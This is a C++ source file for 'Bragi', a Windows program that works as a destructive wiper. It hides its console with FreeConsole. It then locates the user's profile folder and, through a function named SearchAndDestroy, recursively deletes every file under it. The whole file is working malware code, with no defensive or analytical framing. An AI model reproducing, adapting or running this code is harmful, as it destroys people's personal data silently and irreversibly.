#include "Bragi.h"

#ifdef __linux__
/*++++++++++++++Comming Soon++++++++++++++*/
/* Code for Libs for Linux Platform */
#elif _WIN32
/*This Function finds the User path*/
std::wstring Path()
{
	wchar_t path[PATH];
	std::wstring wpath;
	if (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK)
	{
		wpath = path;
	}

	return wpath;
}
bool Dot(const wchar_t* str)
{
	if (wcscmp(str, L"..") && wcscmp(str, L".")) return FALSE;
	return TRUE;
}

/*2nd version of this func*/
std::vector<std::wstring> ListDir(std::wstring s)
{
	std::vector<std::wstring> contents;
	std::wstring w = s + L"\\*";
	WIN32_FIND_DATAW data;
	HANDLE hFind = FindFirstFileW((LPCWSTR)w.c_str(), &data);      // Starts to find the first file inside the directory

	if (hFind != INVALID_HANDLE_VALUE) 
	{
		do {
			std::wstring word(data.cFileName);
			if (Dot(word.c_str())) continue;
			contents.push_back(s + L"\\" + word);
		} while (FindNextFileW(hFind, &data));
		FindClose(hFind);
	}
	return contents;
}

int Delete(std::wstring s)
{
	if (_wremove(s.c_str())) return 0;
	return -1;
}

void SearchAndDestroy(std::wstring dir)
{
	std::vector<std::wstring> filenames;
	filenames = ListDir(dir);
	for (auto filename : filenames)
	{
		Delete(filename);
	}
	for (auto filename : filenames)
	{
		SearchAndDestroy(filename);
	}
}

void windows_Bragi()
{
	// Hide Console
	FreeConsole();
	// Support UTF-16 Encoding
	_setmode(_fileno(stdout), _O_U16TEXT);
	// This vector keeps all directories
	std::vector<std::wstring> directories;
	directories = ListDir(Path());
	// For each folder
	for (auto dir : directories)
	{
		// Move into this directory
		SearchAndDestroy(dir);
	}
}

#endif